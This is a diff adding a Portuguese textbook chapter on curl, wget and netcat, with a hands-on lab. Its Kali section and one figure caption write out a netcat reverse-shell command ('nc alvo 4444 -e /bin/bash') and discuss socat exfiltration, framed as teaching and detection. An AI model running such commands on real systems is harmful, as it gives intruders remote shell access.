@@ -1,3 +1,395 @@
 # HTTP na linha de comando: curl, wget e netcat {#sec-cap082}
 
-*(em elaboracao)*
+Um webhook parou de funcionar. A aplicação jurava estar enviando os dados; o serviço de destino jurava não receber nada. As duas equipes trocaram e-mails por dois dias, cada uma culpando a outra, até alguém rodar um comando:
+
+```bash
+curl -v -X POST https://api.parceiro.com/webhook \
+     -H 'Content-Type: application/json' \
+     -d '{"evento":"teste"}'
+```
+
+```
+> POST /webhook HTTP/2
+< HTTP/2 301
+< location: https://api.parceiro.com/v2/webhook
+```
+
+O parceiro tinha movido o endpoint e deixado um redirecionamento `301` no lugar. A biblioteca HTTP da aplicação, por padrão, **não segue redirecionamento em POST** — ela transformava o POST num GET ou simplesmente parava. Dois dias de discussão que um `-v` encerraria em trinta segundos.
+
+Essa é a razão de existir deste capítulo. Navegador esconde tudo: redirecionamentos, cabeçalhos, renegociação de TLS, o corpo real da resposta. Na linha de comando você vê o protocolo cru, e ver o protocolo cru é o que transforma "não funciona" em "responde `301` para cá". As ferramentas são três, e cada uma tem um território.
+
+## As três ferramentas e onde cada uma reina
+
+- **`curl`** — o canivete do HTTP e de mais duas dúzias de protocolos. Fala uma requisição, mostra tudo, monta qualquer método, cabeçalho e corpo. É a ferramenta de diagnóstico e de automação de API.
+- **`wget`** — o buscador recursivo. Baixa arquivos, espelha sites inteiros, retoma download interrompido, insiste sozinho quando a rede oscila. É a ferramenta de *download*.
+- **`netcat`** (`nc`) — o cano bruto de TCP e UDP. Não entende HTTP nem nada; move bytes entre um socket e a entrada/saída padrão. É a ferramenta de "existe algo escutando nesta porta e o que ele fala?".
+
+A regra prática: interagir com uma API é `curl`; baixar uma release do GitHub é `wget`; testar se a porta 25 responde e o que o servidor SMTP anuncia é `nc`.
+
+## `curl`: ver o protocolo
+
+O comando nu imprime o corpo da resposta e nada mais. O diagnóstico começa com `-v`:
+
+```bash
+curl -v https://exemplo.com/ 2>&1 | head -40
+```
+
+O `-v` marca cada linha com um símbolo, e ler esses símbolos é a habilidade central:
+
+| Prefixo | Significado |
+|---|---|
+| `*` | nota do próprio `curl`: DNS, conexão TCP, handshake TLS, reuso de conexão |
+| `>` | linha **enviada** — sua requisição, cabeçalho por cabeçalho |
+| `<` | linha **recebida** — a resposta do servidor |
+| `{` `}` | dados do corpo (com `--trace`) |
+
+: Os prefixos da saída verbosa do `curl` {#tbl-curl-prefixos}
+
+Ver a requisição sair (`>`) e a resposta voltar (`<`) lado a lado é o que localiza o problema: cabeçalho que você achou que estava mandando e não está, `Host` errado, redirecionamento que ninguém esperava, código de status que contradiz a mensagem de erro da aplicação.
+
+Para inspeção só dos cabeçalhos, sem baixar o corpo:
+
+```bash
+curl -I https://exemplo.com/            # HEAD: só os cabeçalhos de resposta
+curl -sD - -o /dev/null https://exemplo.com/   # cabeçalhos + corpo descartado
+```
+
+### As opções que aparecem em todo comando
+
+```bash
+curl -s URL                 # silencioso: sem barra de progresso (essencial em script)
+curl -sS URL                # silencioso, mas ainda mostra erro
+curl -L URL                 # segue redirecionamento (o que faltava na abertura)
+curl -o arquivo URL         # grava com o nome que você der
+curl -O URL                 # grava com o nome do arquivo remoto
+curl -f URL                 # falha com status != 0 em erro HTTP (para script)
+curl --retry 3 URL          # tenta de novo em falha transitória
+curl -m 10 URL              # timeout total de 10 s
+curl --connect-timeout 5 URL
+```
+
+O `-f` merece atenção: **por padrão o `curl` retorna sucesso mesmo quando o servidor responde `404` ou `500`** — para o `curl`, receber a resposta *é* o sucesso, independentemente do que ela diga. Num script sob `set -e` (@sec-cap071), isso significa que um `curl` de um `500` passa como se tivesse dado certo. O `-f` faz o status HTTP virar status de saída, e é obrigatório em automação.
+
+### Interagindo com uma API
+
+```bash
+# GET com cabeçalho de autenticação
+curl -s -H 'Authorization: Bearer TOKEN' https://api.exemplo.com/v1/itens
+
+# POST com corpo JSON
+curl -s -X POST https://api.exemplo.com/v1/itens \
+     -H 'Content-Type: application/json' \
+     -d '{"nome":"teste","ativo":true}'
+
+# corpo lido de arquivo (evita problema de aspas e de tamanho)
+curl -s -X POST https://api.exemplo.com/v1/itens \
+     -H 'Content-Type: application/json' \
+     --data @corpo.json
+
+# PUT, DELETE, e envio de formulário
+curl -s -X PUT    -d 'estado=fechado' https://api.exemplo.com/v1/itens/42
+curl -s -X DELETE https://api.exemplo.com/v1/itens/42
+curl -s -F 'arquivo=@relatorio.pdf' -F 'titulo=Q3' https://api.exemplo.com/upload
+```
+
+Dois detalhes que evitam bug sutil. `-d` implica POST e o tipo `application/x-www-form-urlencoded` — para JSON, o `Content-Type` explícito é obrigatório, senão a API recebe JSON rotulado como formulário e rejeita. E `-d` **remove quebras de linha**; para enviar um corpo com quebras preservadas, use `--data-binary @arquivo`.
+
+Encadeado com `jq` (@sec-cap069), o `curl` vira cliente de API completo:
+
+```bash
+curl -s https://api.exemplo.com/v1/itens | jq -r '.[] | select(.ativo) | .nome'
+```
+
+### Medindo desempenho sem ferramenta extra
+
+O `-w` extrai números que decompõem a latência de uma requisição:
+
+```bash
+curl -s -o /dev/null -w \
+  'dns:%{time_namelookup} conn:%{time_connect} tls:%{time_appconnect} ttfb:%{time_starttransfer} total:%{time_total}\n' \
+  https://exemplo.com/
+```
+
+Isso separa onde o tempo foi gasto: resolução de nome, conexão TCP, handshake TLS, primeiro byte, total. Um `time_namelookup` alto é DNS lento (@sec-cap080); um `time_starttransfer` alto com o resto baixo é servidor demorando para processar. É o `mtr` do HTTP.
+
+## `wget`: baixar e espelhar
+
+Onde o `curl` inspeciona, o `wget` persiste. A diferença de filosofia aparece nos padrões: o `wget` grava em arquivo por default, mostra barra de progresso, e não desiste ao primeiro tropeço.
+
+```bash
+wget https://exemplo.com/arquivo.iso           # grava arquivo.iso, com progresso
+wget -c https://exemplo.com/arquivo.iso        # -c continua download interrompido
+wget -q URL                                    # quieto
+wget -O destino.iso URL                        # nome de saída
+wget --limit-rate=2m URL                       # limita banda
+wget -i lista-de-urls.txt                      # baixa cada URL do arquivo
+```
+
+O `-c` é a razão de usar `wget` para arquivo grande: uma ISO de 4 GB que caiu em 80% retoma de onde parou, em vez de recomeçar.
+
+Para espelhar um site — documentação para consulta offline, por exemplo:
+
+```bash
+wget --mirror --convert-links --adjust-extension \
+     --page-requisites --no-parent https://docs.exemplo.com/
+```
+
+Cada opção faz uma coisa: `--mirror` liga recursão e checagem de data, `--convert-links` reescreve os links para funcionarem localmente, `--page-requisites` traz CSS e imagens, `--no-parent` impede subir na árvore e baixar o site inteiro por acidente.
+
+::: {.callout-warning}
+Espelhar consome banda e recursos do servidor de destino. Em servidor que não é seu, respeite `robots.txt` e use `--wait=1 --random-wait` para não parecer — nem funcionar como — um ataque de negação de serviço. Espelhar agressivamente um site alheio é abuso, e em volume pode configurar indisponibilização de serviço.
+:::
+
+Uma nota sobre `wget` versus `wget2`: distribuições recentes trazem o `wget2`, reescrito com HTTP/2 e paralelismo. A sintaxe do dia a dia é compatível; algumas opções raras mudaram.
+
+## `netcat`: o cano de TCP puro
+
+O `nc` não entende protocolo nenhum. Ele abre um socket e liga as duas pontas ao terminal — o que o torna a ferramenta certa justamente quando você quer falar o protocolo você mesmo, ou só descobrir se há alguém do outro lado.
+
+::: {#fig-netcat-modos}
+```{.tikz}
+%%| filename: netcat-modos
+%%| alt: Os dois modos do netcat: cliente conectando a uma porta e servidor escutando numa porta, ligados por um fluxo de bytes bidirecional
+\begin{tikzpicture}[
+    mc/.style={rounded corners=3pt,draw,thick,align=center,font=\scriptsize,inner sep=4pt,minimum width=3.0cm,minimum height=1.3cm},
+    io/.style={rounded corners=2pt,draw,semithick,align=center,font=\tiny,inner sep=3pt,minimum width=1.7cm,minimum height=0.55cm,draw=manualgray,fill=manualgray!8},
+    fl/.style={-{Latex[length=1.6mm]},thick},
+    cd/.style={font=\tiny\ttfamily,anchor=west},
+    ttl/.style={font=\scriptsize\bfseries,anchor=west},
+    nt/.style={font=\scriptsize,manualgray,align=left}
+  ]
+  % ---------- modo cliente
+  \node[ttl,manualblue] at (0.3,7.9) {modo cliente --- conecta a uma porta};
+  \node[cd,manualgray] at (0.3,7.45) {nc destino 80};
+  \node[mc,draw=manualblue,fill=manualblue!10] (cli) at (3.4,6.0) {\texttt{nc}\\cliente};
+  \node[mc,draw=manualgray,fill=manualgray!10] (srv) at (9.8,6.0) {serviço\\remoto \texttt{:80}};
+  \node[io] (ki) at (0.9,6.55) {seu teclado};
+  \node[io] (ko) at (0.9,5.45) {sua tela};
+  \draw[fl,manualblue]  (ki) -- (cli.north west);
+  \draw[fl,manualgreen] (cli.south west) -- (ko);
+  \draw[fl,manualblue]  (cli) -- node[font=\tiny,manualblue,above]{o que você digita} (srv);
+  \draw[fl,manualgreen] (srv) -- node[font=\tiny,manualgreen,below]{o que ele responde} (cli);
+
+  \draw[semithick,manualgray,dotted] (0.3,3.9) -- (13.4,3.9);
+
+  % ---------- modo servidor
+  \node[ttl,manualred] at (0.3,3.5) {modo servidor --- escuta numa porta};
+  \node[cd,manualgray] at (0.3,3.05) {nc -lvnp 4444};
+  \node[mc,draw=manualgray,fill=manualgray!10] (cli2) at (2.6,1.7) {quem\\conecta};
+  \node[mc,draw=manualred,fill=manualred!10] (srv2) at (9.4,1.7) {\texttt{nc -l}\\à escuta};
+  \node[io] (t2) at (12.6,1.7) {seu terminal};
+  \draw[fl,manualgray] (cli2) -- node[font=\tiny,manualgray,above]{bytes que chegam} (srv2);
+  \draw[fl,manualred]  (srv2) -- (t2);
+
+  \node[nt,text width=13.2cm,anchor=north] at (6.8,0.85) {O mesmo binário faz os dois papéis, e é essa simetria que o torna útil e perigoso: um \texttt{nc} escutando com \texttt{-e /bin/bash} entrega um shell a quem conectar. Como diagnóstico é insubstituível; como componente de ataque, é o \emph{reverse shell} clássico --- por isso as versões modernas (\texttt{netcat-openbsd}) removeram o \texttt{-e}.};
+\end{tikzpicture}
+```
+Os dois modos do `netcat`: cliente que conecta e servidor que escuta, ligados por um fluxo de bytes.
+:::
+
+### Diagnóstico de porta
+
+```bash
+nc -zv exemplo.com 443           # -z só testa, -v relata; a porta aceita conexão?
+nc -zv exemplo.com 20-25         # varredura de faixa
+nc -zvu servidor 53              # -u para UDP
+```
+
+`-z` não envia dado nenhum: abre a conexão, confirma que foi aceita e fecha. É o teste do degrau 6 do @sec-cap080, e distingue as mesmas duas causas — `succeeded` (alguém escuta) contra `Connection refused` ou timeout.
+
+### Falando o protocolo à mão
+
+Como o `nc` não formata nada, você digita o HTTP cru e vê a resposta bruta:
+
+```bash
+printf 'GET / HTTP/1.1\r\nHost: exemplo.com\r\nConnection: close\r\n\r\n' | nc exemplo.com 80
+```
+
+O mesmo vale para inspecionar o *banner* de um serviço — a linha de identificação que muitos servidores enviam ao conectar:
+
+```bash
+nc -v smtp.exemplo.com 25        # o banner do servidor de e-mail aparece
+```
+
+Ver o banner é reconhecimento passivo puro: o serviço se identifica sozinho, muitas vezes com nome e versão. É a informação que um levantamento de superfície coleta primeiro.
+
+### Transferência direta e conversa entre máquinas
+
+```bash
+# máquina que recebe:
+nc -lvnp 9000 > recebido.tar
+
+# máquina que envia:
+nc -N destino 9000 < enviar.tar
+```
+
+Sem cifragem, sem autenticação, sem verificação de integridade — é um cano nu. Para mover um arquivo entre duas máquinas de um laboratório isolado, é imbatível de simples; para qualquer coisa que atravesse rede não confiável, use `rsync` sobre SSH (@sec-cap081).
+
+Uma ressalva de portabilidade: existem duas implementações. A `netcat-openbsd`, padrão no Kali, usa `-N` para fechar a conexão ao terminar o `stdin` e **não** tem a opção `-e`. A `netcat-traditional` tem `-e` (e por isso é a preferida em tutorial de exploração antigo). O comando `nc -h` diz qual você tem. Alternativas modernas — `ncat` (do Nmap, com TLS), `socat` (muito mais poderoso) — cobrem o que falta.
+
+## TLS pela linha de comando
+
+Quando o problema é o certificado, `curl` e `openssl` mostram o que o navegador esconde atrás do cadeado:
+
+```bash
+# só o handshake e a cadeia de certificados
+curl -vI https://exemplo.com/ 2>&1 | grep -E '^\* (SSL|TLS|subject|issuer|expire)'
+
+# a inspeção completa do certificado
+echo | openssl s_client -connect exemplo.com:443 -servername exemplo.com 2>/dev/null \
+     | openssl x509 -noout -subject -issuer -dates
+```
+
+O `-servername` importa: sem ele, um servidor que hospeda vários domínios (SNI) devolve o certificado errado, e você diagnostica um problema que não existe. Para testar um certificado ainda não confiável — comum durante configuração — `curl -k` (ou `--insecure`) desativa a verificação. **`-k` em script de produção é apagar a única proteção contra intermediário**; use só para diagnóstico manual e consciente.
+
+## 🐉 No Kali
+
+- **`curl` e `wget` são o motor de metade das ferramentas ofensivas, e a mesma requisição muda de natureza pelo alvo.** Buscar uma release de ferramenta é uso trivial; automatizar milhares de requisições contra um servidor alheio para mapear endpoints ou testar parâmetros é ataque a aplicação web, com o enquadramento da Lei 12.737/2012 quando não há autorização. O `-A` (User-Agent) e o `-b`/`-c` (cookies) são o que permite manter sessão autenticada num teste — e o que denuncia automação mal disfarçada num log.
+- **`nc` é a ferramenta didática do *reverse shell*, e entendê-la é defesa.** O par clássico — `nc -lvnp 4444` de um lado, `nc alvo 4444 -e /bin/bash` do outro — é o exemplo canônico de shell reverso, e é exatamente por isso que a `netcat-openbsd` do Kali removeu o `-e`: para que o exemplo exija esforço consciente. Do lado defensivo, o que interessa é o padrão a detectar: uma conexão de **saída** de um servidor para uma porta alta incomum, iniciada pelo próprio servidor, é a assinatura desse ataque — e é por isso que firewall de saída (@sec-cap083) importa tanto quanto o de entrada.
+- **Banner grabbing com `nc` é o reconhecimento mais barato e mais educado.** `nc -v host porta` coleta a identificação que o serviço publica de propósito. Vira problema quando escala para varredura de faixas inteiras — aí é `nmap`, é ruidoso, e sem autorização é reconhecimento não autorizado. Do lado defensivo, reduzir ou falsear banners (`ServerTokens Prod` no Apache, remover a versão do SSH) diminui o que um levantamento colhe de graça.
+- **`socat` é o `nc` com esteroides, e o pivô com TLS.** Onde o `nc` mistura credencial no claro, `socat` faz túnel cifrado, encaminhamento bidirecional e *relay* entre protocolos. Num teste autorizado é a ferramenta de pivô limpa; a mesma capacidade, fora de escopo, é o que exfiltra dados por um canal que o firewall de saída deixou passar. Conhecer `socat` é tão importante para quem defende quanto para quem testa.
+- **`--insecure` é o hábito que vira vulnerabilidade.** Em laboratório com certificado autoassinado, `curl -k` é conveniência inofensiva. O risco é o `-k` migrar para o script que roda em produção, onde ele silencia exatamente o alerta de intermediário que você quer ouvir. Trate `-k` como marcador temporário, nunca como configuração.
+
+> **Nota sobre a família RHEL.** `curl` e `openssl` são idênticos. Diferenças de empacotamento: o `nc` do RHEL costuma ser o `ncat` do Nmap (pacote `nmap-ncat`), cuja sintaxe difere um pouco da `netcat-openbsd` — `-e` existe ali, atrás de `--exec`/`--sh-exec`. O `wget` pode não vir instalado por padrão em imagens mínimas, onde `curl` é o presente. E o `firewalld` ativo de fábrica faz um `nc -zv` de fora dar timeout num serviço recém-subido, enquanto no Kali, sem regra carregada, o mesmo teste conecta na hora — a diferença de comportamento é do firewall, não da ferramenta.
+
+## 🧪 Laboratório
+
+Roteiro para uma VM do Kali com acesso à internet. Vários passos usam um servidor HTTP local para não depender de terceiros.
+
+1. **Veja o protocolo cru e reproduza o caso da abertura.**
+
+   ```bash
+   curl -v https://exemplo.com/ 2>&1 | grep -E '^[*<>]' | head -30
+   curl -sI http://neverssl.com/ | head -5
+   curl -sI -L http://neverssl.com/ | grep -E 'HTTP/|location:'
+   ```
+
+   Esperado: no verboso, as linhas `>` (sua requisição) e `<` (a resposta) claramente separadas. Um site que redireciona mostra `301`/`302` sem `-L` e o destino final com `-L` — a diferença que resolveu o webhook.
+
+2. **Suba um servidor local e converse com ele nos dois clientes.**
+
+   ```bash
+   mkdir -p ~/lab-http && cd ~/lab-http
+   echo '{"status":"ok","itens":[1,2,3]}' > dados.json
+   python3 -m http.server 8080 &
+   sleep 1
+   curl -s http://127.0.0.1:8080/dados.json | jq .
+   wget -q -O baixado.json http://127.0.0.1:8080/dados.json && cat baixado.json
+   ```
+
+   Esperado: o `curl` mostra o JSON formatado pelo `jq`; o `wget` grava o arquivo. Repare que o `curl` imprime na tela por padrão e o `wget` grava por padrão — a diferença de filosofia das duas ferramentas.
+
+3. **Comprove que `curl` não falha sozinho em erro HTTP.**
+
+   ```bash
+   curl -s -o /dev/null -w 'sem -f: status HTTP %{http_code}, saida do curl %{exitcode}\n' \
+        http://127.0.0.1:8080/naoexiste
+   curl -sf -o /dev/null -w 'com -f: status HTTP %{http_code}\n' \
+        http://127.0.0.1:8080/naoexiste; echo "saida do curl: $?"
+   ```
+
+   Esperado: sem `-f`, o HTTP é `404` mas o `curl` sai com `0` — o que num script sob `set -e` passaria por sucesso. Com `-f`, o `curl` sai com `22`. É o motivo de `-f` ser obrigatório em automação.
+
+4. **Interaja com uma API pública real.**
+
+   ```bash
+   curl -s https://httpbin.org/get | jq '.headers, .origin'
+   curl -s -X POST https://httpbin.org/post \
+        -H 'Content-Type: application/json' \
+        -d '{"evento":"teste","n":42}' | jq '.json'
+   curl -s -F 'arquivo=@dados.json' https://httpbin.org/post | jq '.files'
+   ```
+
+   Esperado: o `httpbin` devolve exatamente o que recebeu, então você confirma que o `Content-Type` e o corpo saíram como pretendia. Repita o POST **sem** o cabeçalho `Content-Type` e veja que o campo `.json` vem nulo — a API interpretou como formulário.
+
+5. **Decomponha a latência de uma requisição.**
+
+   ```bash
+   curl -s -o /dev/null -w \
+     'dns=%{time_namelookup}s tcp=%{time_connect}s tls=%{time_appconnect}s ttfb=%{time_starttransfer}s total=%{time_total}s\n' \
+     https://exemplo.com/
+   ```
+
+   Esperado: os tempos crescem em ordem (cada etapa inclui as anteriores). Se `dns` for uma fatia grande do total, o problema é resolução de nomes; se `ttfb` dominar, é o servidor processando.
+
+6. **Teste portas com `netcat` e leia banner.**
+
+   ```bash
+   nc -zv 127.0.0.1 8080
+   nc -zv 127.0.0.1 9999          # ninguém escuta
+   nc -zv scanme.nmap.org 22 80   # host que o Nmap mantém para testes públicos
+   nc -v scanme.nmap.org 22 </dev/null   # o banner do SSH aparece
+   ```
+
+   Esperado: `succeeded`/`open` na 8080 e nas do `scanme`, `refused` na 9999. O banner do SSH revela a versão do OpenSSH — reconhecimento passivo, do serviço que se identifica sozinho.
+
+7. **Fale HTTP à mão pelo cano do `nc`.**
+
+   ```bash
+   printf 'GET /dados.json HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n' \
+        | nc 127.0.0.1 8080
+   ```
+
+   Esperado: a resposta HTTP crua — linha de status, todos os cabeçalhos e o corpo — sem nenhuma formatação. É o que o `curl` faz por você e esconde atrás da apresentação limpa.
+
+8. **Transfira um arquivo pelo cano nu, entre dois terminais.**
+
+   ```bash
+   # terminal A:
+   cd ~/lab-http && nc -lvnp 9000 > recebido.json
+   # terminal B (abra outro):
+   cd ~/lab-http && nc -N 127.0.0.1 9000 < dados.json
+   # de volta ao A, depois que fechar:
+   diff dados.json recebido.json && echo "chegou idêntico"
+   ```
+
+   Esperado: o arquivo atravessa e o `diff` confirma. Nenhuma cifragem envolvida — por isso serve para laboratório isolado, não para rede real.
+
+9. **Espelhe uma seção pequena de site para consulta offline.**
+
+   ```bash
+   cd ~/lab-http
+   wget --mirror --convert-links --adjust-extension --page-requisites \
+        --no-parent --wait=1 --level=1 https://example.com/
+   find example.com -type f
+   ```
+
+   Esperado: os arquivos do `example.com` gravados localmente com links reescritos. O `--wait=1` e o `--level=1` mantêm o espelhamento educado e contido — sem eles, `--mirror` num site grande vira um problema para o servidor de destino.
+
+10. **Inspecione o certificado TLS.**
+
+    ```bash
+    echo | openssl s_client -connect exemplo.com:443 -servername exemplo.com 2>/dev/null \
+         | openssl x509 -noout -subject -issuer -dates
+    curl -vI https://exemplo.com/ 2>&1 | grep -iE 'subject:|issuer:|expire|SSL connection'
+    ```
+
+    Esperado: emissor, titular e validade do certificado. Rode com um domínio prestes a expirar, se conhecer um, para ver a data de expiração próxima — o dado que evita a queda por certificado vencido.
+
+11. **Veja o `-k` mascarando um problema real.**
+
+    ```bash
+    curl -sI https://self-signed.badssl.com/ 2>&1 | head -3 || echo "recusou: certificado invalido"
+    curl -skI https://self-signed.badssl.com/ | head -3
+    ```
+
+    Esperado: sem `-k`, o `curl` recusa e explica que o certificado não é confiável; com `-k`, conecta e some o alerta. Em diagnóstico é aceitável; num script de produção, é desligar a defesa contra intermediário.
+
+12. **Limpe o laboratório.**
+
+    ```bash
+    kill %1 2>/dev/null
+    cd ~ && rm -rf ~/lab-http
+    ```
+
+    Esperado: o servidor HTTP encerra e o diretório some. Confira que nenhum `python3 -m http.server` ficou rodando com `pgrep -af http.server`.
+
+## Resumo
+
+- **Na linha de comando você vê o protocolo cru**, e é isso que transforma "não funciona" em um diagnóstico. O `-v` do `curl` mostra a requisição (`>`) e a resposta (`<`) lado a lado; foi o que faltava no caso do webhook.
+- **`curl` inspeciona e automatiza API; `wget` baixa e espelha; `nc` é o cano de TCP.** Interagir com API é `curl`, arquivo grande é `wget -c`, testar porta e ler banner é `nc`.
+- **`curl` retorna sucesso mesmo em `404` e `500`** — para ele, receber a resposta é o sucesso. Em script, `-f` é obrigatório para o status HTTP virar status de saída, e `-sS` mantém a saída limpa mostrando só erro.
+- **`-d` implica POST e formato de formulário.** Para JSON, o `Content-Type: application/json` explícito é obrigatório, e `--data-binary @arquivo` preserva quebras de linha que `-d` remove.
+- **`-w` decompõe a latência** em DNS, TCP, TLS e primeiro byte — o `mtr` do HTTP, sem instalar nada.
+- **`nc` não entende protocolo nenhum**, e por isso serve tanto para testar porta (`-z`) quanto para falar HTTP à mão e ler o banner que o serviço publica. O mesmo binário escuta e conecta — a simetria que o torna a ferramenta didática do shell reverso.
+- **`-servername` no `openssl s_client` é obrigatório em servidor com SNI**, senão você inspeciona o certificado errado. `curl -k` é para diagnóstico manual; em produção, apaga a proteção contra intermediário.
